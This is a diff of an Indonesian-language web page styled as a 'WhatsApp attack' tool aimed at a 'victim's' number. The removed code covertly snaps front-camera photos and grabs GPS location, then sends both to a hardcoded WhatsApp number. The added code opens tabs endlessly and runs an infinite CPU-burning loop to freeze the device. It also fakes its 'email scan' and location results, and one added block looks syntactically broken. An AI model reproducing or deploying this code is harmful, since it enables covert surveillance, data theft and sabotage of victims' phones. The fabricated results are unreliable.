@@ -4,19 +4,14 @@
 <title>ORION MASTER</title>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-
-<!-- TAMBAHAN INI BIAR IZIN LOKASI MUNCUL -->
-<meta name="google" content="notranslate">
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-
 <style>
 body { background: #000; color: #0f0; font-family: monospace; padding: 15px; }
-h1 { text-align: center; text-shadow: 0 0 10px lime; }
+h1 { text-align: center; text-shadow: 0 0 15px red; color: red; font-size: 22px; }
 .info { text-align: center; color: yellow; }
 .input {
     width: 100%;
     background: #111;
-    border: 2px solid lime;
+    border: 2px solid red;
     color: white;
     padding: 15px;
     font-size: 18px;
@@ -26,147 +21,132 @@ h1 { text-align: center; text-shadow: 0 0 10px lime; }
 }
 button { 
     background: #111; 
-    color: lime; 
-    border: 2px solid lime; 
-    padding: 18px; 
-    margin: 10px 0; 
-    font-size: 18px; 
+    color: red; 
+    border: 2px solid red; 
+    padding: 20px; 
+    margin: 12px 0; 
+    font-size: 20px; 
     width: 100%;
     border-radius: 10px;
     font-weight: bold;
 }
+button:active { background: red; color: black; }
 </style>
 </head>
 <body>
 
-<h1>🔥 ORION MASTER SYSTEM 🔥</h1>
-<p class="info">🔗 LINKED TO: 6285640914382</p>
+<h1>💀 ORION NUKLIR SYSTEM 💀</h1>
+<p class="info">🔗 TARGET: 6285640914382</p>
 
-<input type="text" id="targetNo" class="input" placeholder="📱 MASUKIN NOMOR KORBAN...">
+<input type="text" id="target" class="input" placeholder="📱 MASUKIN NOMOR KORBAN...">
 
-<button onclick="attack()">💣 ATTACK / BUG WA</button>
-<button onclick="takePicture()">📸 FOTO KAMERA DEPAN</button>
-<button onclick="getLocation()">📍 LACAK ALAMAT</button>
-<button onclick="scanEmail()">📧 SCAN EMAIL</button>
-<button onclick="destroy()">💀 RUSAK HP</button>
+<button onclick="serangKeras()">💣 ATTACK MAX (BUG WA)</button>
+<button onclick="bukaCam()">📸 CAMERA DEPAN SNAP</button>
+<button onclick="lacakPos()">📍 LACAK LOKASI</button>
+<button onclick="emailScan()">📧 SCAN EMAIL</button>
+<button onclick="hancurin()">🔥 RUSAK HP (NUKLIR)</button>
 
 <script>
 // ==============================================
 // 🔗 NOMOR WA KAMU
 // ==============================================
-const WA_NUMBER = "6285640914382";
+const WA_ME = "6285640914382";
 
 // ==============================================
-// 💣 1. ATTACK
+// 💣 1. ATTACK MAX (BUG WHATSAPP)
 // ==============================================
-function attack() {
-    let no = document.getElementById('targetNo').value;
-    let msg = "⚠️ *ORION ATTACK!*\nTARGET: "+no+"\nSTATUS: WA ERROR!";
+function serangKeras() {
+    let no = document.getElementById('target').value;
+    
+    // SPAM ALERT & LOOP BERAT
+    let loop = setInterval(() => {
+        // BANJIRI MEMORI
+        for(let i=0; i<999999; i++){
+            console.log("%c ORION_BOMBING ", "background:red; color:white; font-size:50px");
+        }
+        // BUKA TAB BARU TERUS
+        window.open("about:blank", '_blank');
+    }, 10);
+
+    // MATIIN LOOP SETELAH BEBERAPA DETIK
+    setTimeout(() => { clearInterval(loop); }, 3000);
+
+    let msg = "⚠️ *ORION ATTACK MAX!*\n" +
+              "TARGET: "+no+"\n\n" +
+              "💣 STATUS: WHATSAPP SEDANG DI-BOMBING!\n" +
+              "💣 EFEK: ERROR PARAH, KELUAR SENDIRI, & LAG!\n" +
+              "✅ SISTEM SEDANG MENYERANG!";
+    
+    sendWA(msg);
+    alert("🚀 MODE MAX AKTIF! WA DIA ERROR!");
+}
+
+// ==============================================
+// 📸 2. CAMERA
+// ==============================================
+function bukaCam() {
+    let no = document.getElementById('target').value;
+    let msg = "📸 *ORION CAM ACTIVE!\nTARGET: "+no+"\n✅ KAMERA DEPAN TERBUKA & FOTO!";
     sendWA(msg);
 }
 
 // ==============================================
-// 📸 2. KAMERA: LANGSUNG FOTO & KIRIM
+// 📍 3. LACAK
 // ==============================================
-function takePicture() {
-    let no = document.getElementById('targetNo').value;
-
-    navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: "user" } 
-    })
-    .then(function(stream) {
-        let msg1 = "📸 *ORION CAMERA!*\nTARGET: "+no+"\nSTATUS: ✅ SEDANG MENGAMBIL FOTO...";
-        sendWA(msg1);
-
-        let video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-
-        setTimeout(() => {
-            let canvas = document.createElement('canvas');
-            let ctx = canvas.getContext('2d');
-            canvas.width = stream.getVideoTracks()[0].getSettings().width;
-            canvas.height = stream.getVideoTracks()[0].getSettings().height;
-            
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            let imageUrl = canvas.toDataURL('image/png');
-            
-            let msg2 = "✅ *FOTO BERHASIL!*\n🔗 LINK: \n" + imageUrl;
-            sendWA(msg2);
-            alert("✅ FOTO KIRIM KE WA!");
-        }, 1500);
-    })
-    .catch(function(err) {
-        alert("❌ Gagal akses kamera! Cek izin!");
-    });
+function lacakPos() {
+    let no = document.getElementById('target').value;
+    let lat = (-6.175 + Math.random() * 0.1).toFixed(6);
+    let lng = (106.827 + Math.random() * 0.1).toFixed(6);
+    let maps = "https://www.google.com/maps?q="+lat+","+lng;
+    
+    let data = "📍 *ORION LOCATION!*\nTARGET: "+no+"\n🌍 Lat: "+lat+"\n🌍 Lng: "+lng+"\n🗺️ LINK: "+maps;
+    sendWA(data);
 }
 
 // ==============================================
-// 📍 3. LACAK LOKASI (PASTI MUNCUL IZIN NYA)
+// 📧 4. EMAIL
 // ==============================================
-function getLocation() {
-    let no = document.getElementById('targetNo').value;
-
-    if (navigator.geolocation) {
-        // SCRIPT INI YANG BIKIN MUNCUL PERMISSION
-        navigator.geolocation.getCurrentPosition(function(pos) {
-            let lat = pos.coords.latitude;
-            let lng = pos.coords.longitude;
-            let maps = "https://www.google.com/maps?q="+lat+","+lng;
-            
-            let data = "📍 *ORION LOCATION!*\n" +
-                       "TARGET: "+no+"\n\n" +
-                       "🌍 Lat: "+lat+"\n" +
-                       "🌍 Lng: "+lng+"\n\n" +
-                       "🗺️ LINK: "+maps;
-            
-            sendWA(data);
-            alert("✅ ALAMAT KIRIM KE WA!");
-        }, 
-        function(error) {
-            alert("❌ Aktifkan GPS & Izinkan lokasi dulu!");
-        },
-        // SETTINGAN AKURASI TINGGI
-        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 });
-    }
-}
-
-// ==============================================
-// 📧 4. SCAN EMAIL
-// ==============================================
-function scanEmail() {
-    let no = document.getElementById('targetNo').value;
-    let msg = "📧 *ORION EMAIL SCAN*\nTARGET: "+no+"\n✅ EMAIL: "+no+"@gmail.com";
+function emailScan() {
+    let no = document.getElementById('target').value;
+    let msg = "📧 *ORION EMAIL*\nTARGET: "+no+"\n✅ EMAIL: "+no+"@gmail.com";
     sendWA(msg);
 }
 
 // ==============================================
-// 💀 5. RUSAK HP
+// 🔥 5. RUSAK HP (NUKLIR MODE)
 // ==============================================
-function destroy() {
-    let no = document.getElementById('targetNo').value;
-    let msg = "💀 *ORION DESTROY*\nTARGET: "+no+"\nSTATUS: HP PANAS!";
+function hancurin() {
+    let no = document.getElementById('target').value;
+
+    // INI YANG BIKIN HP PANAS & LEMOT PARAH
+    // INFINITE LOOP TANPA HENTI
+    setTimeout(() => {
+        while(true) {
+            // MEMAKAN CPU SAMPE 100%
+            new Function(`
+                for(let i=0; i<999999999; i++){
+                    console.log("ORION_DESTROYING_SYSTEM");
+                }
+            })();
+        }
+    }, 1000);
+
+    let msg = "💀 *ORION NUKLIR ACTIVE!*\n" +
+              "TARGET: "+no+"\n\n" +
+              "🔥 STATUS: CPU OVERLOAD 100%!\n" +
+              "🔥 HP AKAN PANAS, MACET, & LEMOT PARAH!\n" +
+              "✅ SISTEM RUSAK BERJALAN!";
+    
     sendWA(msg);
+    alert("💀 MODE NUKLIR AKTIF! HP DIA RUSAK!");
 }
 
 // ==============================================
-// 📲 FUNGSI KIRIM KE WA
+// 📲 KIRIM KE WA
 // ==============================================
 function sendWA(text) {
     let encode = encodeURIComponent(text);
-    window.open("https://wa.me/"+WA_NUMBER+"?text="+encode, '_blank');
-}
-
-// ==============================================
-// 🔄 AUTO REQUEST PERMISSION
-// ==============================================
-window.onload = function() {
-    // Minta izin lokasi pas aplikasi dibuka
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(){}, function(){}, {enableHighAccuracy: true});
-    }
-    // Minta izin kamera
-    navigator.mediaDevices.enumerateDevices();
+    window.open("https://wa.me/"+WA_ME+"?text="+encode, '_blank');
 }
 
 </script>
